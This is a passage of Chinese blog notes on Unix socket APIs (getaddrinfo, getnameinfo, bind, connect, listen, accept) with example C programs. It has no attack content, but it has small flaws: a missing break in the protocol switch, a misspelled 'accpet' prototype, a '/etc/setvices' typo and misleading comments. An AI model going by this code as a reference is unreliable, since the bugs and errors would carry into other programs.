...<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>hint</code>：用于过滤地址的模板</li></ul><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>AI_ADDRCONFIG</td><td>查询配置的地址类型（IPv4或IPv6）</td></tr><tr><td>AI_ALL</td><td>查询IPv4和IPv6地址</td></tr><tr><td>AI_CANONNAME</td><td>需要一个规范的名字</td></tr><tr><td>AI_NUMERICHOST</td><td>以数字格式指定主机地址，不翻译</td></tr><tr><td>AI_NUMERICSERV</td><td>将服务指定为数字端口号，不翻译</td></tr><tr><td>AI_PASSIVE</td><td>套接字地址用于监听绑定</td></tr><tr><td>AI_V4MAPPED</td><td>如没有找到IPv6地址，返回映射到IPv6格式的IPv4地址</td></tr></tbody></table><h2 id="gai-strerror"><a href="#gai-strerror" class="headerlink" title="gai_strerror"></a>gai_strerror</h2><p>用于打印<code>getaddrinfo</code>的失败消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">gai_strerror</span><span class="hljs-params">(<span class="hljs-type">int</span> error)</span>;<br><span class="hljs-comment">//返回值：指向描述错误的字符串的指针</span><br></code></pre></td></tr></table></figure><h2 id="getnameinfo"><a href="#getnameinfo" class="headerlink" title="getnameinfo"></a>getnameinfo</h2><p><code>getnameinfo</code>函数将一个地址转换成一个主机名和一个服务名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getnameinfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *<span class="hljs-keyword">restrict</span> addr, <span class="hljs-type">socklen_t</span> alen,</span><br><span class="hljs-params">               <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> host, <span class="hljs-type">socklen_t</span> hostlen,</span><br><span class="hljs-params">               <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> service, <span class="hljs-type">socklen_t</span> servlen, <span class="hljs-type">int</span> flags)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回非0值</span><br></code></pre></td></tr></table></figure><p><code>flag</code>参数提供了控制翻译的方式</p><table><thead><tr><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>NI_DGRAM</td><td>服务基于数据包而非基于流</td></tr><tr><td>NI_NAMEREQD</td><td>如果找不到主机名，将其作为一个错误对待</td></tr><tr><td>NI_NOFQDN</td><td>对于本地主机，仅返回全限定域名的节点名部分</td></tr><tr><td>NI_NUMERICHOST</td><td>返回主机地址的数字形式</td></tr><tr><td>NI_NUMERICSCOPE</td><td>对于IPv6，返回范围ID的数字形式</td></tr><tr><td>NI_NUMERICSERV</td><td>返回服务地址的数字形式，即端口号</td></tr></tbody></table><p><strong>16-9.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(SOLARIS)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(BSD)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">void</span> <br><span class="hljs-title function_">print_family</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> addrinfo *aip)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; family \n&quot;</span>);<br>    <span class="hljs-keyword">switch</span>(aip-&gt;ai_family)&#123;<br>        <span class="hljs-keyword">case</span> AF_INET:<br>            <span class="hljs-comment">//IPv4</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;inet\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> AF_INET6:<br>            <span class="hljs-comment">//IPv6</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;inet6\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> AF_UNIX:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unix\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> AF_UNSPEC:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unspecified\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unknown\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">print_type</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> addrinfo *aip)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; type \n&quot;</span>);<br>    <span class="hljs-keyword">switch</span> (aip-&gt;ai_socktype)&#123;<br>        <span class="hljs-keyword">case</span> SOCK_STREAM:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stream\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SOCK_DGRAM:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;datagram\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SOCK_SEQPACKET:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;seqpacket\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> SOCK_RAW:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;raw\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unknow (%d)\n&quot;</span>, aip-&gt;ai_socktype);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">print_protocol</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> addrinfo *aip)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; protocol \n&quot;</span>);<br>    <span class="hljs-keyword">switch</span> (aip-&gt;ai_protocol)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;default\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> IPPROTO_TCP:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TCP\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> IPPROTO_UDP:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UDP\n&quot;</span>);<br>    <span class="hljs-keyword">case</span> IPPROTO_RAW:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;raw\n&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unknow (%d)\n&quot;</span>, aip-&gt;ai_protocol);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">print_flags</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> addrinfo *aip)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags\n&quot;</span>);<br>    <span class="hljs-keyword">if</span> (aip-&gt;ai_flags == <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 0&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (aip-&gt;ai_flags &amp; AI_PASSIVE)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; passive\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (aip-&gt;ai_flags &amp; AI_CANONNAME)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; cannon\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (aip-&gt;ai_flags &amp; AI_NUMERICHOST)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; numhost\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (aip-&gt;ai_flags &amp; AI_NUMERICSERV)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; numserv\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (aip-&gt;ai_flags &amp; AI_V4MAPPED)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; v4mapped\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (aip-&gt;ai_flags &amp; AI_ALL)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; all\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> *<span class="hljs-title">ailist</span>, *<span class="hljs-title">aip</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">addrinfo</span> <span class="hljs-title">hint</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">sinp</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *addr;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-type">char</span> abuf[INET_ADDRSTRLEN];<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s nodename service&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    hint.ai_flags = AI_CANONNAME;<br>    hint.ai_family = <span class="hljs-number">0</span>;<br>    hint.ai_socktype = <span class="hljs-number">0</span>;<br>    hint.ai_protocol = <span class="hljs-number">0</span>;<br>    hint.ai_addrlen = <span class="hljs-number">0</span>;<br>    hint.ai_canonname = <span class="hljs-literal">NULL</span>;<br>    hint.ai_addr = <span class="hljs-literal">NULL</span>;<br>    hint.ai_next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((err = getaddrinfo(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], &amp;hint, &amp;ailist)) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;getaddrinfo erro: %s&quot;</span>, gai_strerror(err));<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (aip = ailist; aip != <span class="hljs-literal">NULL</span>; aip = aip-&gt;ai_next)&#123;<br>        print_flags(aip);<br>        print_family(aip);<br>        print_type(aip);<br>        print_protocol(aip);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\thost %s&quot;</span>, aip-&gt;ai_canonname ? aip-&gt;ai_canonname:<span class="hljs-string">&quot;-&quot;</span>);<br>        <span class="hljs-keyword">if</span> (aip-&gt;ai_family == AF_INET) &#123;<br>            sinp = (<span class="hljs-keyword">struct</span>  sockaddr_in *)aip-&gt;ai_addr;<br>            addr = inet_ntop(AF_INET, &amp;sinp-&gt;sin_addr, abuf, INET_ADDRSTRLEN);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; address %s&quot;</span>, addr?addr:<span class="hljs-string">&quot;unknown&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; port %d&quot;</span>, ntohs(sinp-&gt;sin_port));<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h2><p>服务器使用<code>bind</code>函数关联地址与套接字，服务器通常选择保留一个地址并且注册在<code>/etc/setvices</code>或者某个名字服务中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> len)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><h2 id="getsockname"><a href="#getsockname" class="headerlink" title="getsockname"></a>getsockname</h2><p>调用<code>getsockname</code>函数来发现绑定到套接字上的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getsockname</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-keyword">struct</span> sockaddr *<span class="hljs-keyword">restrict</span> addr, <span class="hljs-type">socklen_t</span> *<span class="hljs-keyword">restrict</span> alenp)</span>;<br><br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>alenp</code>：指向整数指针，里面存放着缓冲区<code>sockaddr</code>的长度，若成功执行则将返回长度存放到该整数中</li></ul><h2 id="getpeername"><a href="#getpeername" class="headerlink" title="getpeername"></a>getpeername</h2><p>若与对等方建立了连接，那么通过<code>getpeername</code>函数可以获得对方绑定的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getpeername</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-keyword">struct</span> sockaddr *<span class="hljs-keyword">restrict</span> addr, <span class="hljs-type">socklen_t</span> *<span class="hljs-keyword">restrict</span> alenp)</span>;<br></code></pre></td></tr></table></figure><h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><p><code>connect</code>函数用于需要建立客户端与服务器之间的连接，例如<code>SOCK_STREAM</code>或<code>SOCK_SEQPACKET</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> len)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>sockfd</code>：本地的套接字</li><li><code>addr</code>：需要建立连接的远程地址</li></ul><p><strong>16-10.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSLEEP 128</span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">connect_retry</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> alen)</span> <span class="hljs-comment">//重连</span><br>&#123;<br>    <span class="hljs-type">int</span> numsec;<br><br>    <span class="hljs-keyword">for</span> (numsec = <span class="hljs-number">1</span>; numsec &lt;= MAXSLEEP; numsec &lt;&lt;= <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span> (connect(sockfd, addr, alen) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//连接出错</span><br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (numsec &lt;= MAXSLEEP/<span class="hljs-number">2</span>)<br>            sleep(numsec); <span class="hljs-comment">//休眠时间 1 2 4 8.....64 65 66 ....128</span><br>    &#125;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>16-11.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSLEEP 128    </span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">connect_retry</span><span class="hljs-params">(<span class="hljs-type">int</span> domain, <span class="hljs-type">int</span> type, <span class="hljs-type">int</span> protocol, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> alen)</span><br>&#123;<br>    <span class="hljs-type">int</span> numsec, fd;<br>    <span class="hljs-keyword">for</span> (numsec = <span class="hljs-number">1</span>; numsec &lt;= MAXSLEEP; numsec &lt;&lt;= <span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((fd = socket(domain, type, protocol)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (connect(fd, addr, alen) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span>(fd);<br>        &#125;<br>        close(fd);<br><br>        <span class="hljs-keyword">if</span> (numsec &lt;= MAXSLEEP/<span class="hljs-number">2</span>)<br>            sleep(numsec);<br>    &#125;<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h2><p>服务器调用<code>listen</code>函数表示愿意接受请求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> backlog)</span>;<br><span class="hljs-comment">//返回值：若成功，返回0；若出错，返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>backlog</code>：提供提示，用于指示系统该进程所要入队的未完成连接请求数量</li></ul><h2 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h2><p>服务器用于接收连接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">accpet</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-keyword">struct</span> sockaddr *<span class="hljs-keyword">restrict</span> addr, <span class="hljs-type">socklen_t</span> *<span class="hljs-keyword">restrict</span> len)</span>;<br><span class="hljs-comment">//返回值：若成功，返回文件描述符；若出错返回-1</span><br></code></pre></td></tr></table></figure><ul><li><code>addr</code>：用于存储客户端的地址，不需要时可以设置为<code>NULL</code></li><li><code>len</code>：缓冲区的长度</li></ul><p><strong>16-12.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">initserver</span><span class="hljs-params">(<span class="hljs-type">int</span> type, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> alen, <span class="hljs-type">int</span> qlen)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">int</span> err = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ((fd = socket(addr-&gt;sa_family, type, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (bind(fd, addr, alen) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">goto</span> errout;<br>    <span class="hljs-keyword">if</span> (type == SOCK_STREAM || type == SOCK_SEQPACKET)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (listen(fd, qlen) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-keyword">return</span>(fd);<br>    errout:<br>        err = errno;<br>        close(fd);<br>        errno  = err;<br>        <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="send"><a href="#send" class="headerlink" title="send"></a>send</h2><p>用于网络套接字发送数据，才使用这个函数之前，连接已经建立完毕</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">send</span><span class="hljs-params">(<span 